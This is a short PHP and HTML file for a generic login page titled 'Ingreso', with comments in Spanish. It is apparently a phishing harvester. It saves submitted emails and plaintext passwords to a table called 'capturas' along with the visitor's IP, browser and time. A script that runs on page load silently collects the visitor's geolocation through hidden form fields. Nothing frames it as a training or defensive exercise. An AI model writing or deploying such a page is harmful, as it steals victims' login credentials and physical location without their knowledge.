<?php
// Conexión a la base de datos
$conexion = new mysqli("localhost", "root", "", "datos");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Extraer info del sistema
    $ip = $_SERVER['REMOTE_ADDR'];
    $so = php_uname();
    $navegador = $_SERVER['HTTP_USER_AGENT'];
    $fecha = date('Y-m-d H:i:s');

    // Coordenadas vía JS
    $lat = $_POST['lat'] ?? 'No disponible';
    $lon = $_POST['lon'] ?? 'No disponible';

    $stmt = $conexion->prepare("INSERT INTO capturas (correo, contrasena, ip, so, navegador, fecha, latitud, longitud) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssssss", $correo, $contrasena, $ip, $so, $navegador, $fecha, $lat, $lon);
    $stmt->execute();
    $stmt->close();

    // Redirección para recargar la página y evitar reenvío del formulario
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Ingreso</title>
    <script>
        function obtenerUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    document.getElementById("lat").value = position.coords.latitude;
                    document.getElementById("lon").value = position.coords.longitude;
                });
            }
        }
        window.onload = obtenerUbicacion;
    </script>
</head>
<body>
    <h2>Ingresa tus datos</h2>
    <form method="post">
        <input type="email" name="correo" placeholder="Correo" required><br><br>
        <input type="password" name="contrasena" placeholder="Contraseña" required><br><br>
        <input type="hidden" name="lat" id="lat">
        <input type="hidden" name="lon" id="lon">
        <button type="submit">Enviar</button>
    </form>
</body>
</html>
